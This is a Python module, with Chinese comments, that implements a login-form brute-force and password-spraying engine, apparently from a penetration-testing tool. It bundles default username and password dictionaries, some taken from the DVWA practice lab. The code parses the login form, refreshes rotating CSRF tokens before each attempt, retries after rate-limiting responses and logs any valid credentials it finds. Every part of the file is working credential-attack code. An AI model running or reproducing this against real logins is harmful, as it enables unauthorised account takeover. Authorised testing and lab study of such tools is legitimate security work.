# -*- coding: utf-8 -*-
"""表单弱口令爆破引擎：字典驱动 + 双策略 + 实时进度。"""

import re
import time

from .forms import parse_form
from .httpclient import HTTPError

DEFAULT_USERS = ["admin", "administrator", "root", "gordonb", "pablo", "smithy", "1337",
                 "user", "test", "guest"]
DEFAULT_PASSWORDS = ["password", "123456", "admin", "letmein", "abc123", "charley",
                     "password1", "12345678", "qwerty", "111111", "admin123", "test",
                     "passw0rd", "root", "welcome"]


class BruteEngine:
    def __init__(self, agent, task):
        self.a = agent
        self.t = task

    def _judge(self, text: str, status: int, cfg: dict) -> bool:
        low = text.lower()

        def words(field):
            value = cfg.get(field) or []
            if isinstance(value, str):
                value = re.split(r"[\n,;]+", value)
            return [str(k).strip().lower() for k in value if str(k).strip()]

        success_kw = words("success_keywords")
        failure_kw = words("failure_keywords")
        if success_kw and any(k in low for k in success_kw):
            return True
        pattern = (cfg.get("success_regex") or "").strip()
        if pattern:
            try:
                if re.search(pattern, text, re.I):
                    return True
            except re.error:
                pass
        if failure_kw and any(k in low for k in failure_kw):
            return False
        if success_kw or pattern:
            return False
        threshold = int(cfg.get("length_threshold") or 900)
        return status == 200 and len(text) >= threshold

    @staticmethod
    def _split(text: str) -> list[str]:
        if not text:
            return []
        parts = re.split(r"[\s,;]+", text.strip())
        seen, out = set(), []
        for part in parts:
            if part and part not in seen:
                seen.add(part)
                out.append(part)
        return out

    def _prepare_form(self, user_field: str, quiet: bool = False) -> dict | None:
        try:
            page = self.a.raw("GET", self.a.base, params=self.a.query or None)
        except HTTPError as exc:
            if not quiet:
                self.t.warn(f"登录表单识别失败：{exc}")
            return None
        form = parse_form(page.text, user_field, page.url)
        if form and not quiet:
            tokens = [name for name in form["names"] if "token" in name.lower()]
            self.t.info(f"识别登录表单：{form['method']} {form['action']} · "
                        f"字段 {', '.join(form['names'])}"
                        + (f"（自动携带 {tokens[0]}）" if tokens else ""))
            if tokens:
                self.t.info("检测到轮换 token：每次尝试前自动刷新，失败会 sleep 数秒，请耐心等待")
        return form

    def _attempt(self, payload: dict, form: dict | None):
        if not form:
            return self.a.send(payload)
        data = dict(form["fields"])
        data.update(payload)
        if form["method"] == "POST":
            return self.a.raw("POST", form["action"], data=data)
        return self.a.raw("GET", form["action"], params=data)

    def run(self, cfg: dict) -> dict:
        users = self._split(cfg.get("usernames", "")) or list(DEFAULT_USERS)
        passwords = self._split(cfg.get("passwords", "")) or list(DEFAULT_PASSWORDS)
        user_field = cfg.get("user_field") or "username"
        pass_field = cfg.get("pass_field") or "password"
        submit_field = (cfg.get("submit_field") or "").strip()
        submit_value = cfg.get("submit_value") or "Login"
        delay = max(0.0, min(float(cfg.get("delay") or 0.2), 5.0))
        mode = cfg.get("mode") or "smart"
        max_attempts = int(cfg.get("max_attempts") or 500)
        stop_on_first = bool(cfg.get("stop_on_first"))
        auto_backoff = cfg.get("auto_backoff", True) is not False
        spray = mode == "spray"

        sequence = ([(user, password) for password in passwords for user in users]
                    if spray else
                    [(user, password) for user in users for password in passwords])
        total = min(len(sequence), max_attempts)
        self.t.info(f"用户 {len(users)} × 密码 {len(passwords)}，上限 {max_attempts} 次")
        self.t.info(f"字段：{user_field} / {pass_field}" + (f" / {submit_field}" if submit_field else ""))
        self.t.info("策略：密码喷洒（同一密码轮询所有用户）" if spray else f"策略：{mode}")

        attempts = 0
        found = []
        hit_users: set[str] = set()
        blocked = ""
        started = time.time()
        form = self._prepare_form(user_field)
        needs_token = bool(form and any("token" in name.lower() for name in form["names"]))

        for user, password in sequence:
            self.t.check_stop()
            if stop_on_first and found:
                break
            if attempts >= max_attempts:
                self.t.warn("达到尝试上限，停止")
                break
            if not spray and mode == "smart" and user in hit_users:
                continue

            attempts += 1
            payload = {user_field: user, pass_field: password}
            if submit_field:
                payload[submit_field] = submit_value

            resp = None
            for retry in range(3):
                if needs_token:
                    fresh = self._prepare_form(user_field, quiet=True)
                    if fresh:
                        form = fresh
                try:
                    resp = self._attempt(payload, form)
                except HTTPError as exc:
                    self.t.err(str(exc))
                    blocked = str(exc)
                    break
                limited = (resp.status in (429, 503)
                           or "too many requests" in resp.text.lower())
                if not limited:
                    break
                if auto_backoff and retry < 2:
                    wait = 2 * (retry + 1)
                    self.t.warn(f"触发限速（HTTP {resp.status}），{wait}s 后重试")
                    time.sleep(wait)
                    continue
                self.t.err(f"目标返回 {resp.status}，疑似触发限速 / 锁定，已自动停止")
                blocked = f"HTTP {resp.status}"
                break

            if blocked or resp is None:
                break

            ok = self._judge(resp.text, resp.status, cfg)
            if ok:
                found.append({"username": user, "password": password,
                              "status": resp.status, "length": resp.length})
                hit_users.add(user)
                self.t.ok(f"命中：{user} / {password}")
            else:
                self.t.data(f"[{attempts}/{total}] {user}:{password} 失败（{resp.length}B）")

            elapsed = time.time() - started
            rate = attempts / elapsed if elapsed > 0 else 0
            self.t.set_progress(attempts / max(total, 1),
                                f"{attempts}/{total} 次，{rate:.1f} 次/秒")
            if delay:
                time.sleep(delay)

        self.t.step_msg("爆破结束")
        if blocked:
            self.t.warn(f"任务提前结束：{blocked}")
        if found:
            self.t.ok(f"共找到 {len(found)} 组有效凭证")
        else:
            self.t.warn("未找到有效凭证，可更换字典或调整成功特征")
        return {
            "found": found,
            "attempts": attempts,
            "elapsed": round(time.time() - started, 2),
            "blocked": blocked,
            "summary": (f"弱口令命中 {len(found)} 组："
                        + ", ".join(f"{f['username']}/{f['password']}" for f in found[:5])
                        if found else f"弱口令测试 {attempts} 次，无命中"),
            "severity": "critical" if found else "info",
        }
